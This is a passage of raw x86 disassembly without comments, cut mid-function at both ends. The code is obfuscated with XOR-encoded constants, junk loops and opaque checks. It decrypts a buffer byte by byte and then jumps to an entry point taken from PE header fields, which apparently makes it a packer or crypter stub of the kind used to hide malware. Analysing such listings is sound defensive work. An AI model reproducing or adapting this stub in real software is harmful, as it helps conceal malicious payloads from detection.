  401eb9:	jae    0x401ef8
  401ebf:	cmp    DWORD PTR ds:0x429028,0x7
  401ec6:	jne    0x401ed7
  401ecc:	push   0x42a018
  401ed1:	call   DWORD PTR ds:0x42e9d3
  401ed7:	cmp    DWORD PTR ds:0x429028,0x6
  401ede:	jne    0x401ef3
  401ee4:	xor    ecx,ecx
  401ee6:	add    ecx,DWORD PTR ds:0x429028
  401eec:	inc    ecx
  401eed:	mov    DWORD PTR ds:0x429028,ecx
  401ef3:	jmp    0x401ea5
  401ef8:	mov    eax,DWORD PTR [ebp-0xc]
  401efb:	mov    DWORD PTR ds:0x42c018,0x16
  401f05:	cmp    DWORD PTR ds:0x42c018,0x0
  401f0c:	je     0x401f44
  401f12:	cmp    DWORD PTR ds:0x42c018,0x20
  401f19:	jne    0x401f34
  401f1f:	push   0x42a010
  401f24:	push   0x42b014
  401f29:	push   0x42d004
  401f2e:	call   DWORD PTR ds:0x42e993
  401f34:	mov    eax,ds:0x42c018
  401f39:	dec    eax
  401f3a:	mov    ds:0x42c018,eax
  401f3f:	jmp    0x401f05
  401f44:	mov    eax,DWORD PTR [ebp-0x8]
  401f47:	add    DWORD PTR ds:0x42d014,0x2c68
  401f51:	mov    DWORD PTR [ebp+0xc],eax
  401f54:	mov    eax,eax
  401f56:	mov    eax,ds:0x42e313
  401f5b:	movzx  ecx,BYTE PTR ds:0x42900c
  401f62:	and    DWORD PTR ds:0x42d014,ecx
  401f68:	mov    eax,DWORD PTR [eax+0x1c8]
  401f6e:	not    DWORD PTR ds:0x429024
  401f74:	mov    eax,DWORD PTR [eax]
  401f76:	cdq    
  401f77:	and    DWORD PTR ds:0x42a00c,0x0
  401f81:	jmp    0x401f95
  401f86:	xor    ebx,ebx
  401f88:	xor    ebx,DWORD PTR ds:0x42a00c
  401f8e:	inc    ebx
  401f8f:	mov    DWORD PTR ds:0x42a00c,ebx
  401f95:	cmp    DWORD PTR ds:0x42a00c,0x10
  401f9c:	jae    0x401fe4
  401fa2:	cmp    DWORD PTR ds:0x42a00c,0x8
  401fa9:	jne    0x401fbf
  401faf:	push   0x0
  401fb1:	push   DWORD PTR [ebp-0x18]
  401fb4:	push   0x4e1d
  401fb9:	call   DWORD PTR ds:0x42e997
  401fbf:	cmp    DWORD PTR ds:0x42a00c,0x7
  401fc6:	jne    0x401fd9
  401fcc:	mov    ebx,DWORD PTR ds:0x42a00c
  401fd2:	inc    ebx
  401fd3:	mov    DWORD PTR ds:0x42a00c,ebx
  401fd9:	jmp    0x401f86
  401fde:	and    ecx,0x6703
  401fe4:	mov    ebx,eax
  401fe6:	add    eax,DWORD PTR ds:0x429000
  401fec:	mov    eax,0xfabdbee9
  401ff1:	sbb    ecx,DWORD PTR ds:0x42c000
  401ff7:	add    ebx,eax
  401ff9:	adc    edx,0xffffffff
  401ffc:	mov    ecx,DWORD PTR ds:0x42d004
  402002:	adc    DWORD PTR ds:0x42a008,ecx
  402008:	and    DWORD PTR [ebp-0x10],0x0
  40200c:	add    ecx,0x4d2b
  402012:	xor    edx,0x0
  402015:	mov    DWORD PTR [ebp-0x6c],edx
  402018:	mov    edx,DWORD PTR [ebp+0xc]
  40201b:	mov    DWORD PTR ds:0x42c004,0x11
  402025:	cmp    DWORD PTR ds:0x42c004,0x0
  40202c:	je     0x40207c
  402032:	cmp    DWORD PTR ds:0x42c004,0x1d
  402039:	jne    0x40205c
  40203f:	push   DWORD PTR [ebp-0x10]
  402042:	push   DWORD PTR [ebp-0x24]
  402045:	push   0x429014
  40204a:	push   DWORD PTR [ebp-0x24]
  40204d:	push   DWORD PTR [ebp-0x28]
  402050:	push   DWORD PTR [ebp-0x24]
  402053:	push   DWORD PTR [ebp-0x1c]
  402056:	call   DWORD PTR ds:0x42e99f
  40205c:	mov    ecx,DWORD PTR ds:0x42c004
  402062:	dec    ecx
  402063:	mov    DWORD PTR ds:0x42c004,ecx
  402069:	jmp    0x402025
  40206e:	xor    ecx,ecx
  402070:	add    ecx,DWORD PTR ds:0x42c014
  402076:	and    DWORD PTR ds:0x42b004,ecx
  40207c:	mov    DWORD PTR [ebp-0x14],edx
  40207f:	mov    ecx,0x8a29a12b
  402084:	xor    ebx,ecx
  402086:	add    DWORD PTR [ebp-0x14],eax
  402089:	mov    edx,DWORD PTR [ebp-0x14]
  40208c:	adc    DWORD PTR [ebp-0x10],0xffffffff
  402090:	xor    edx,ecx
  402092:	mov    DWORD PTR [ebp-0x58],edx
  402095:	mov    edx,DWORD PTR [ebp-0x10]
  402098:	xor    edx,0x0
  40209b:	mov    DWORD PTR [ebp-0x54],edx
  40209e:	cmp    DWORD PTR [ebp-0x58],ebx
  4020a1:	jne    0x4020b3
  4020a7:	mov    edx,DWORD PTR [ebp-0x6c]
  4020aa:	cmp    DWORD PTR [ebp-0x54],edx
  4020ad:	je     0x4020e2
  4020b3:	mov    edx,DWORD PTR ds:0x42e313
  4020b9:	mov    edx,DWORD PTR [edx+0x1c0]
  4020bf:	mov    edx,DWORD PTR [edx]
  4020c1:	xor    ebx,ebx
  4020c3:	add    edx,eax
  4020c5:	adc    ebx,0xffffffff
  4020c8:	xor    edx,ecx
  4020ca:	xor    ebx,0x0
  4020cd:	cmp    edx,0x70941fc1
  4020d3:	jne    0x40268d
  4020d9:	cmp    ebx,0xffffffff
  4020dc:	jne    0x40268d
  4020e2:	mov    edx,DWORD PTR ds:0x42e38f
  4020e8:	mov    ebx,DWORD PTR ds:0x42e397
  4020ee:	xor    edx,ebx
  4020f0:	mov    DWORD PTR ds:0x42e38f,edx
  4020f6:	mov    ebx,DWORD PTR ds:0x42e38f
  4020fc:	mov    edx,DWORD PTR [ebp-0x40]
  4020ff:	add    DWORD PTR [edx],ebx
  402101:	jmp    0x40264e
  402106:	mov    eax,DWORD PTR [ebp-0x3c]
  402109:	cmp    eax,0xf89c85b8
  40210e:	je     0x40216b
  402114:	mov    eax,DWORD PTR [ebp-0x8]
  402117:	mov    ecx,DWORD PTR [ebp-0x44]
  40211a:	xor    eax,esi
  40211c:	add    eax,edi
  40211e:	cmp    eax,ecx
  402120:	je     0x40216b
  402126:	mov    eax,ds:0x42e313
  40212b:	mov    eax,DWORD PTR [eax+0x194]
  402131:	mov    ecx,DWORD PTR [eax]
  402133:	mov    eax,DWORD PTR [ecx+0x3c]
  402136:	push   DWORD PTR ds:0x42e3eb
  40213c:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  402140:	push   DWORD PTR ds:0x42e197
  402146:	add    eax,ecx
  402148:	mov    ecx,DWORD PTR ds:0x42e313
  40214e:	mov    ecx,DWORD PTR [ecx+0x194]
  402154:	push   DWORD PTR [ecx]
  402156:	call   eax
  402158:	mov    ecx,DWORD PTR ds:0x42e313
  40215e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  402164:	mov    DWORD PTR [ecx],eax
  402166:	jmp    0x40268d
  40216b:	mov    eax,DWORD PTR [ebp-0x8]
  40216e:	mov    ecx,DWORD PTR [ebp-0x7c]
  402171:	xor    eax,esi
  402173:	add    eax,edi
  402175:	cmp    eax,ecx
  402177:	jne    0x402548
  40217d:	mov    eax,DWORD PTR [ebp-0x8]
  402180:	mov    ecx,DWORD PTR ds:0x42e313
  402186:	mov    ecx,DWORD PTR [ecx+0x198]
  40218c:	xor    eax,esi
  40218e:	add    eax,edi
  402190:	cmp    eax,DWORD PTR [ecx]
  402192:	jne    0x4021b1
  402198:	mov    eax,DWORD PTR [ebp-0x8]
  40219b:	push   0xf89c85b9
  4021a0:	xor    eax,esi
  4021a2:	add    eax,edi
  4021a4:	push   eax
  4021a5:	push   ebx
  4021a6:	push   DWORD PTR [ebp-0xc]
  4021a9:	push   DWORD PTR [ebp-0x8]
  4021ac:	call   0x409ed5
  4021b1:	mov    eax,DWORD PTR [ebp-0xc]
  4021b4:	mov    DWORD PTR [ebp-0x48],eax
  4021b7:	mov    eax,DWORD PTR [ebp-0x8]
  4021ba:	mov    DWORD PTR [ebp-0x1c],eax
  4021bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4021c0:	xor    eax,esi
  4021c2:	add    eax,edi
  4021c4:	mov    DWORD PTR [ebp+0x10],eax
  4021c7:	mov    eax,ds:0x42e193
  4021cc:	mov    eax,DWORD PTR [eax]
  4021ce:	mov    DWORD PTR [ebp+0x10],eax
  4021d1:	mov    eax,ds:0x42e39b
  4021d6:	mov    eax,DWORD PTR [eax]
  4021d8:	mov    DWORD PTR [ebp-0x18],eax
  4021db:	mov    DWORD PTR [ebp+0xc],0xf89c87b9
  4021e2:	mov    eax,DWORD PTR [ebp+0xc]
  4021e5:	xor    eax,esi
  4021e7:	add    eax,edi
  4021e9:	mov    DWORD PTR [ebp+0xc],eax
  4021ec:	mov    eax,ds:0x42e313
  4021f1:	mov    DWORD PTR [ebp+0xc],eax
  4021f4:	mov    eax,DWORD PTR [ebp+0x10]
  4021f7:	mov    DWORD PTR [ebp+0xc],eax
  4021fa:	mov    eax,DWORD PTR [ebp+0xc]
  4021fd:	push   0x4
  4021ff:	pop    ecx
  402200:	sub    ecx,eax
  402202:	add    ecx,DWORD PTR [ebp-0x18]
  402205:	mov    DWORD PTR [ebp-0x30],0xf89c85f9
  40220c:	mov    DWORD PTR [ebp+0x10],ecx
  40220f:	mov    DWORD PTR [ebp-0xe4],ebx
  402215:	mov    eax,DWORD PTR [ebp+0xc]
  402218:	mov    DWORD PTR [ebp-0xe0],eax
  40221e:	mov    eax,DWORD PTR [ebp+0x10]
  402221:	mov    DWORD PTR [ebp-0xdc],eax
  402227:	mov    eax,DWORD PTR [ebp-0x30]
  40222a:	xor    eax,esi
  40222c:	add    eax,edi
  40222e:	mov    DWORD PTR [ebp-0xd8],eax
  402234:	lea    eax,[ebp-0x88]
  40223a:	mov    DWORD PTR [ebp-0xd4],eax
  402240:	mov    eax,DWORD PTR [ebp-0xe4]
  402246:	xor    eax,esi
  402248:	add    eax,edi
  40224a:	mov    DWORD PTR [ebp-0xe4],eax
  402250:	lea    eax,[ebp-0xe4]
  402256:	push   eax
  402257:	mov    eax,DWORD PTR [ebp-0x48]
  40225a:	xor    eax,esi
  40225c:	add    eax,edi
  40225e:	push   eax
  40225f:	mov    eax,ds:0x42e333
  402264:	push   0x42e289
  402269:	push   DWORD PTR [eax]
  40226b:	call   0x402992
  402270:	mov    eax,DWORD PTR [ebp+0xc]
  402273:	mov    ecx,DWORD PTR [ebp+0x10]
  402276:	mov    DWORD PTR [ebp-0x84],ecx
  40227c:	mov    ecx,DWORD PTR [ebp-0x1c]
  40227f:	xor    ecx,esi
  402281:	mov    DWORD PTR [ebp-0x18],eax
  402284:	add    ecx,edi
  402286:	jmp    0x4024e9
  40228b:	lea    edx,[ecx+eax*1]
  40228e:	mov    DWORD PTR [ebp+0x10],edx
  402291:	mov    edx,DWORD PTR [ebp-0x84]
  402297:	sub    edx,ecx
  402299:	mov    DWORD PTR [ebp+0xc],edx
  40229c:	mov    edx,DWORD PTR [ebp+0xc]
  40229f:	mov    DWORD PTR [ebp-0x4c],edx
  4022a2:	mov    edx,DWORD PTR [ebp+0x10]
  4022a5:	mov    DWORD PTR [ebp-0x50],0xf89c85b9
  4022ac:	mov    DWORD PTR [ebp-0x6c],edx
  4022af:	mov    DWORD PTR [ebp-0x20],0xf89c85b8
  4022b6:	mov    edx,DWORD PTR [ebp-0x50]
  4022b9:	xor    edx,esi
  4022bb:	add    edx,edi
  4022bd:	mov    DWORD PTR [ebp+0x10],edx
  4022c0:	mov    edx,DWORD PTR [ebp-0x50]
  4022c3:	xor    edx,esi
  4022c5:	add    edx,edi
  4022c7:	mov    DWORD PTR [ebp+0xc],edx
  4022ca:	mov    DWORD PTR [ebp-0x68],0xf89c85d9
  4022d1:	mov    DWORD PTR [ebp-0x74],0xf89c85be
  4022d8:	mov    edx,DWORD PTR [ebp-0x50]
  4022db:	mov    ebx,DWORD PTR [ebp-0x4c]
  4022de:	xor    edx,esi
  4022e0:	add    edx,edi
  4022e2:	cmp    ebx,edx
  4022e4:	je     0x4024dd
  4022ea:	mov    eax,DWORD PTR [ebp-0x20]
  4022ed:	xor    eax,esi
  4022ef:	mov    edx,0xffcd8d20
  4022f4:	sub    edx,eax
  4022f6:	add    edx,DWORD PTR [ebp-0x4c]
  4022f9:	mov    eax,DWORD PTR [ebp-0x20]
  4022fc:	mov    ebx,DWORD PTR [ebp+0x10]
  4022ff:	xor    eax,esi
  402301:	add    eax,edi
  402303:	imul   eax,ebx
  402306:	cmp    eax,edx
  402308:	ja     0x4024da
  40230e:	mov    edx,DWORD PTR [ebp+0x10]
  402311:	mov    eax,DWORD PTR [ebp-0x4c]
  402314:	mov    ebx,DWORD PTR [ebp-0x68]
  402317:	sub    eax,edx
  402319:	xor    ebx,esi
  40231b:	xor    edx,edx
  40231d:	add    ebx,edi
  40231f:	div    ebx
  402321:	mov    DWORD PTR [ebp+0xc],eax
  402324:	mov    eax,DWORD PTR [ebp-0x74]
  402327:	mov    edx,DWORD PTR [ebp+0xc]
  40232a:	xor    eax,esi
  40232c:	add    eax,edi
  40232e:	cmp    edx,eax
  402330:	jbe    0x402340
  402336:	mov    eax,DWORD PTR [ebp-0x74]
  402339:	xor    eax,esi
  40233b:	add    eax,edi
  40233d:	mov    DWORD PTR [ebp+0xc],eax
  402340:	mov    eax,DWORD PTR [ebp-0x68]
  402343:	mov    edx,DWORD PTR [ebp+0xc]
  402346:	xor    eax,esi
  402348:	add    eax,edi
  40234a:	imul   eax,edx
  40234d:	mov    DWORD PTR [ebp+0xc],eax
  402350:	mov    eax,DWORD PTR [ebp-0x50]
  402353:	mov    edx,DWORD PTR [ebp+0xc]
  402356:	xor    eax,esi
  402358:	add    eax,edi
  40235a:	cmp    edx,eax
  40235c:	je     0x4024c3
  402362:	mov    eax,DWORD PTR [ebp+0xc]
  402365:	mov    DWORD PTR [ebp-0x34],eax
  402368:	mov    eax,DWORD PTR [ebp+0x10]
  40236b:	add    eax,DWORD PTR [ebp-0x6c]
  40236e:	mov    DWORD PTR [ebp-0x30],0xf89c85b9
  402375:	mov    DWORD PTR [ebp-0x28],eax
  402378:	mov    eax,0xf89c85b8
  40237d:	mov    DWORD PTR [ebp-0x5c],eax
  402380:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  402387:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  40238e:	mov    DWORD PTR [ebp-0x38],eax
  402391:	mov    eax,DWORD PTR [ebp-0x30]
  402394:	xor    eax,esi
  402396:	add    eax,edi
  402398:	jmp    0x40247f
  40239d:	mov    DWORD PTR [ebp-0x78],0xf89c85b3
  4023a4:	mov    DWORD PTR [ebp-0x80],0xf89c85ad
  4023ab:	mov    eax,DWORD PTR [ebp-0x38]
  4023ae:	mov    edx,DWORD PTR [ebp+0xc]
  4023b1:	xor    eax,esi
  4023b3:	add    eax,edi
  4023b5:	imul   eax,edx
  4023b8:	mov    edx,DWORD PTR [ebp-0x28]
  4023bb:	mov    al,BYTE PTR [eax+edx*1]
  4023be:	mov    BYTE PTR [ebp-0x1],al
  4023c1:	mov    eax,DWORD PTR [ebp-0x38]
  4023c4:	mov    edx,DWORD PTR [ebp+0xc]
  4023c7:	xor    eax,esi
  4023c9:	add    eax,edi
  4023cb:	imul   eax,edx
  4023ce:	mov    edx,DWORD PTR [ebp-0x54]
  4023d1:	xor    edx,esi
  4023d3:	add    eax,edx
  4023d5:	mov    edx,DWORD PTR [ebp-0x28]
  4023d8:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e0]
  4023e0:	mov    edx,DWORD PTR [ebp-0x78]
  4023e3:	xor    edx,esi
  4023e5:	lea    eax,[edx+eax*1+0x3272e0]
  4023ec:	movzx  edx,BYTE PTR [ebp-0x1]
  4023f0:	xor    edx,eax
  4023f2:	mov    BYTE PTR [ebp-0x1],dl
  4023f5:	mov    al,BYTE PTR [ebp-0x1]
  4023f8:	mov    edx,DWORD PTR [ebp-0x38]
  4023fb:	mov    ebx,DWORD PTR [ebp+0xc]
  4023fe:	xor    edx,esi
  402400:	add    edx,edi
  402402:	imul   edx,ebx
  402405:	mov    ebx,DWORD PTR [ebp-0x28]
  402408:	mov    BYTE PTR [edx+ebx*1],al
  40240b:	mov    eax,DWORD PTR [ebp-0x38]
  40240e:	mov    edx,DWORD PTR [ebp+0xc]
  402411:	xor    eax,esi
  402413:	add    eax,edi
  402415:	imul   eax,edx
  402418:	mov    edx,DWORD PTR [ebp-0x28]
  40241b:	mov    al,BYTE PTR [eax+edx*1]
  40241e:	mov    BYTE PTR [ebp-0x1],al
  402421:	mov    eax,DWORD PTR [ebp-0x38]
  402424:	mov    edx,DWORD PTR [ebp+0xc]
  402427:	xor    eax,esi
  402429:	add    eax,edi
  40242b:	imul   eax,edx
  40242e:	mov    edx,DWORD PTR [ebp-0x5c]
  402431:	xor    edx,esi
  402433:	add    eax,edx
  402435:	mov    edx,DWORD PTR [ebp-0x28]
  402438:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e0]
  402440:	mov    edx,DWORD PTR [ebp-0x80]
  402443:	xor    edx,esi
  402445:	lea    eax,[edx+eax*1+0x3272e0]
  40244c:	movzx  edx,BYTE PTR [ebp-0x1]
  402450:	xor    edx,eax
  402452:	mov    BYTE PTR [ebp-0x1],dl
  402455:	mov    al,BYTE PTR [ebp-0x1]
  402458:	mov    edx,DWORD PTR [ebp-0x38]
  40245b:	mov    ebx,DWORD PTR [ebp+0xc]
  40245e:	xor    edx,esi
  402460:	add    edx,edi
  402462:	imul   edx,ebx
  402465:	mov    ebx,DWORD PTR [ebp-0x28]
  402468:	mov    BYTE PTR [edx+ebx*1],al
  40246b:	mov    eax,DWORD PTR [ebp-0x10]
  40246e:	mov    edx,DWORD PTR [ebp-0x5c]
  402471:	xor    eax,esi
  402473:	xor    edx,esi
  402475:	add    eax,edi
  402477:	add    edx,edi
  402479:	imul   eax,edx
  40247c:	add    eax,DWORD PTR [ebp+0xc]
  40247f:	mov    DWORD PTR [ebp+0xc],eax
  402482:	mov    eax,DWORD PTR [ebp+0xc]
  402485:	mov    edx,DWORD PTR [ebp-0x34]
  402488:	cmp    edx,eax
  40248a:	jb     0x40239d
  402490:	mov    eax,DWORD PTR [ebp-0x5c]
  402493:	mov    edx,DWORD PTR [ebp-0x34]
  402496:	xor    eax,esi
  402498:	add    eax,edi
  40249a:	imul   eax,edx
  40249d:	mov    edx,DWORD PTR [ebp-0x30]
  4024a0:	xor    edx,esi
  4024a2:	add    edx,edi
  4024a4:	or     eax,edx
  4024a6:	mov    edx,DWORD PTR [ebp-0x20]
  4024a9:	xor    edx,esi
  4024ab:	add    eax,edx
  4024ad:	mov    edx,DWORD PTR [ebp-0x20]
  4024b0:	xor    edx,esi
  4024b2:	add    eax,edx
  4024b4:	mov    edx,DWORD PTR [ebp+0x10]
  4024b7:	lea    eax,[eax+edx*1+0x64e5c0]
  4024be:	jmp    0x4024d2
  4024c3:	mov    eax,DWORD PTR [ebp-0x20]
  4024c6:	mov    edx,DWORD PTR [ebp+0x10]
  4024c9:	xor    eax,esi
  4024cb:	lea    eax,[eax+edx*1+0x3272e0]
  4024d2:	mov    DWORD PTR [ebp+0x10],eax
  4024d5:	jmp    0x4022ea
  4024da:	mov    eax,DWORD PTR [ebp-0x18]
  4024dd:	mov    edx,DWORD PTR [ebp-0x48]
  4024e0:	xor    edx,esi
  4024e2:	lea    ecx,[ecx+edx*1+0x3272e0]
  4024e9:	lea    edx,[ecx-0x3272e0]
  4024ef:	xor    edx,esi
  4024f1:	cmp    edx,0xf89c95b9
  4024f7:	jne    0x40228b
  4024fd:	mov    ecx,DWORD PTR [ebp-0x1c]
  402500:	mov    edx,DWORD PTR [ebp-0x48]
  402503:	mov    ebx,DWORD PTR [ebp-0x1c]
  402506:	xor    edx,esi
  402508:	mov    dl,BYTE PTR [edx+eax*1+0x3272e0]
  40250f:	xor    ecx,esi
  402511:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e0]
  402518:	xor    ebx,esi
  40251a:	mov    BYTE PTR [ebx+eax*1+0x3272e0],dl
  402521:	mov    edx,DWORD PTR [ebp-0x48]
  402524:	xor    edx,esi
  402526:	mov    BYTE PTR [edx+eax*1+0x3272e0],cl
  40252d:	mov    eax,DWORD PTR [ebp-0x48]
  402530:	mov    eax,DWORD PTR [ebp-0x8]
  402533:	xor    eax,esi
  402535:	add    eax,edi
  402537:	mov    ds:0x42e397,eax
  40253c:	mov    eax,DWORD PTR [ebp-0x8]
  40253f:	xor    eax,esi
  402541:	add    eax,edi
  402543:	mov    ds:0x42e38f,eax
  402548:	lea    eax,[ebp-0x2c]
  40254b:	mov    DWORD PTR [ebp-0x90],eax
  402551:	lea    eax,[ebp+0x4]
  402554:	mov    DWORD PTR [ebp-0x2c],eax
  402557:	mov    eax,DWORD PTR [ebp-0x2c]
  40255a:	test   eax,eax
  40255c:	je     0x40268d
  402562:	mov    DWORD PTR [ebp-0xa0],0xf152c30
  40256c:	mov    DWORD PTR [ebp-0x98],0x712ed0f
  402576:	mov    DWORD PTR [ebp-0x8c],0x373fc21
  402580:	mov    DWORD PTR [ebp-0x94],0x72670a11
  40258a:	call   0x4053bb
  40258f:	mov    eax,DWORD PTR [ebp-0x24]
  402592:	mov    eax,DWORD PTR [ebp-0xc]
  402595:	mov    eax,DWORD PTR [ebp-0x8]
  402598:	mov    DWORD PTR [ebp+0xc],eax
  40259b:	mov    eax,eax
  40259d:	mov    eax,ds:0x42e313
  4025a2:	mov    eax,DWORD PTR [eax+0x1c8]
  4025a8:	mov    eax,DWORD PTR [eax]
  4025aa:	cdq    
  4025ab:	mov    ebx,eax
  4025ad:	mov    eax,0xfabdbee9
  4025b2:	add    ebx,eax
  4025b4:	adc    edx,0xffffffff
  4025b7:	and    DWORD PTR [ebp-0x10],0x0
  4025bb:	xor    edx,0x0
  4025be:	mov    DWORD PTR [ebp-0x6c],edx
  4025c1:	mov    edx,DWORD PTR [ebp+0xc]
  4025c4:	mov    DWORD PTR [ebp-0x14],edx
  4025c7:	mov    ecx,0x8a29a12b
  4025cc:	xor    ebx,ecx
  4025ce:	add    DWORD PTR [ebp-0x14],eax
  4025d1:	mov    edx,DWORD PTR [ebp-0x14]
  4025d4:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4025d8:	xor    edx,ecx
  4025da:	mov    DWORD PTR [ebp-0x58],edx
  4025dd:	mov    edx,DWORD PTR [ebp-0x10]
  4025e0:	xor    edx,0x0
  4025e3:	mov    DWORD PTR [ebp-0x54],edx
  4025e6:	cmp    DWORD PTR [ebp-0x58],ebx
  4025e9:	jne    0x4025fb
  4025ef:	mov    edx,DWORD PTR [ebp-0x6c]
  4025f2:	cmp    DWORD PTR [ebp-0x54],edx
  4025f5:	je     0x40262a
  4025fb:	mov    edx,DWORD PTR ds:0x42e313
  402601:	mov    edx,DWORD PTR [edx+0x1c0]
  402607:	mov    edx,DWORD PTR [edx]
  402609:	xor    ebx,ebx
  40260b:	add    edx,eax
  40260d:	adc    ebx,0xffffffff
  402610:	xor    edx,ecx
  402612:	xor    ebx,0x0
  402615:	cmp    edx,0x70941fc1
  40261b:	jne    0x40268d
  402621:	cmp    ebx,0xffffffff
  402624:	jne    0x40268d
  40262a:	mov    edx,DWORD PTR ds:0x42e38f
  402630:	mov    ebx,DWORD PTR ds:0x42e397
  402636:	xor    edx,ebx
  402638:	mov    DWORD PTR ds:0x42e38f,edx
  40263e:	mov    edx,DWORD PTR [ebp-0x2c]
  402641:	mov    ebx,DWORD PTR ds:0x42e38f
  402647:	add    ebx,DWORD PTR [edx]
  402649:	mov    edx,DWORD PTR [ebp-0x2c]
  40264c:	mov    DWORD PTR [edx],ebx
  40264e:	mov    edx,DWORD PTR [ebp+0xc]
  402651:	xor    esi,edx
  402653:	mov    edx,DWORD PTR ds:0x42e38f
  402659:	add    esi,edi
  40265b:	xor    ebx,ebx
  40265d:	add    esi,eax
  40265f:	adc    ebx,0xffffffff
  402662:	xor    edi,edi
  402664:	xor    esi,ecx
  402666:	xor    ebx,0x0
  402669:	add    edx,eax
  40266b:	adc    edi,0xffffffff
  40266e:	xor    edx,ecx
  402670:	xor    edi,0x0
  402673:	cmp    edx,esi
  402675:	jne    0x40268d
  40267b:	cmp    edi,ebx
  40267d:	jne    0x40268d
  402683:	mov    eax,ds:0x42e38f
  402688:	mov    ds:0x42e397,eax
  40268d:	mov    eax,ds:0x42e313
  402692:	push   0x4
  402694:	add    eax,0x1cc
  402699:	push   eax
  40269a:	lea    eax,[ebp-0x24]
  40269d:	push   eax
  40269e:	call   0x4026bd
  4026a3:	mov    eax,DWORD PTR [ebp-0x24]
  4026a6:	mov    eax,DWORD PTR [eax]
  4026a8:	pop    ebx
  4026a9:	pop    esi
  4026aa:	pop    edi
  4026ab:	leave  
  4026ac:	ret    0xc
  4026af:	xor    eax,eax
  4026b1:	sub    DWORD PTR ds:0x429010,0x42b004
  4026bb:	inc    eax
  4026bc:	ret    
  4026bd:	push   ebp
  4026be:	mov    ebp,esp
  4026c0:	sub    esp,0x10
  4026c3:	mov    eax,0xf89c85b9
  4026c8:	and    DWORD PTR ds:0x42b01c,0x0
  4026d2:	jmp    0x4026e4
  4026d7:	mov    edx,DWORD PTR ds:0x42b01c
  4026dd:	inc    edx
  4026de:	mov    DWORD PTR ds:0x42b01c,edx
  4026e4:	cmp    DWORD PTR ds:0x42b01c,0x17
  4026eb:	jae    0x402746
  4026f1:	cmp    DWORD PTR ds:0x42b01c,0x9
  4026f8:	jne    0x40271b
  4026fe:	push   0x42a010
  402703:	push   DWORD PTR [ebp-0x20]
  402706:	push   0x42e111
  40270b:	push   0x54f4
  402710:	push   0x3b26
  402715:	call   DWORD PTR ds:0x42e9a3
  40271b:	cmp    DWORD PTR ds:0x42b01c,0x8
  402722:	jne    0x402735
  402728:	mov    edx,DWORD PTR ds:0x42b01c
  40272e:	inc    edx
  40272f:	mov    DWORD PTR ds:0x42b01c,edx
  402735:	jmp    0x4026d7
  40273a:	mov    edx,DWORD PTR ds:0x42c000
  402740:	or     DWORD PTR ds:0x429018,edx
  402746:	mov    DWORD PTR [ebp-0x4],eax
  402749:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  402750:	mov    ecx,DWORD PTR [ebp-0x4]
  402753:	xor    edx,0x6f97
  402759:	push   esi
  40275a:	adc    esi,esi
  40275c:	mov    edx,0x7510899
  402761:	sbb    DWORD PTR ds:0x429008,0x3023
  40276b:	xor    ecx,edx
  40276d:	and    DWORD PTR ds:0x42900c,ebx
  402773:	mov    esi,0x3272e0
  402778:	push   edi
  402779:	mov    DWORD PTR ds:0x42d01c,0xa60
  402783:	mov    edi,DWORD PTR [ebp+0x10]
  402786:	sub    DWORD PTR ds:0x42c00c,0x3e85
  402790:	add    ecx,esi
  402792:	cmp    ecx,edi
  402794:	mov    DWORD PTR ds:0x42b010,0x6d5c
  40279e:	je     0x4028b7
  4027a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4027a7:	mov    edi,DWORD PTR ds:0x42b000
  4027ad:	sbb    DWORD PTR ds:0x429000,edi
  4027b3:	mov    edi,DWORD PTR [ebp+0x10]
  4027b6:	xor    eax,eax
  4027b8:	xor    ecx,edx
  4027ba:	xor    DWORD PTR ds:0x42900c,0x42a014
  4027c4:	add    ecx,esi
  4027c6:	xor    DWORD PTR ds:0x42d004,0x5916
  4027d0:	add    edi,0xfabdbee9
  4027d6:	adc    eax,0xffffffff
  4027d9:	not    DWORD PTR ds:0x42c004
  4027df:	xor    eax,0x0
  4027e2:	add    DWORD PTR ds:0x42c010,0x42c014
  4027ec:	mov    DWORD PTR [ebp-0xc],eax
  4027ef:	inc    eax
  4027f0:	push   ebx
  4027f1:	add    eax,0x103f
  4027f6:	xor    ebx,ebx
  4027f8:	xor    edi,0x8a29a12b
  4027fe:	mov    eax,ecx
  402800:	add    eax,0xfabdbee9
  402805:	adc    ebx,0xffffffff
  402808:	mov    DWORD PTR ds:0x42c00c,0x588f
  402812:	xor    eax,0x8a29a12b
  402817:	xor    ebx,0x0
  40281a:	mov    DWORD PTR ds:0x42d01c,0x82d
  402824:	cmp    eax,edi
  402826:	mov    DWORD PTR ds:0x42c01c,0x36f6
  402830:	jne    0x402849
  402836:	cmp    ebx,DWORD PTR [ebp-0xc]
  402839:	je     0x4028b1
  40283f:	jmp    0x402849
  402844:	mov    esi,0x3272e0
  402849:	mov    eax,DWORD PTR [ebp-0x4]
  40284c:	mov    edi,DWORD PTR [ebp-0x8]
  40284f:	xor    edi,edx
  402851:	add    edi,esi
  402853:	mov    esi,DWORD PTR [ebp+0x8]
  402856:	imul   edi,ecx
  402859:	mov    ebx,DWORD PTR [ebp+0xc]
  40285c:	xor    eax,edx
  40285e:	add    eax,ecx
  402860:	mov    al,BYTE PTR [ebx+eax*1+0x3272e0]
  402867:	mov    BYTE PTR [edi+esi*1],al
  40286a:	mov    eax,DWORD PTR [ebp-0x8]
  40286d:	mov    esi,DWORD PTR [ebp+0x10]
  402870:	xor    eax,edx
  402872:	xor    ebx,ebx
  402874:	add    esi,0xfabdbee9
  40287a:	adc    ebx,0xffffffff
  40287d:	lea    ecx,[ecx+eax*1+0x3272e0]
  402884:	xor    edi,edi
  402886:	xor    esi,0x8a29a12b
  40288c:	xor    ebx,0x0
  40288f:	mov    eax,ecx
  402891:	add    eax,0xfabdbee9
  402896:	adc    edi,0xffffffff
  402899:	xor    eax,0x8a29a12b
  40289e:	xor    edi,0x0
  4028a1:	cmp    eax,esi
  4028a3:	jne    0x402844
  4028a9:	cmp    edi,ebx
  4028ab:	jne    0x402844
  4028b1:	mov    eax,0xf89c85b8
  4028b6:	pop    ebx
  4028b7:	pop    edi
  4028b8:	pop    esi
  4028b9:	leave  
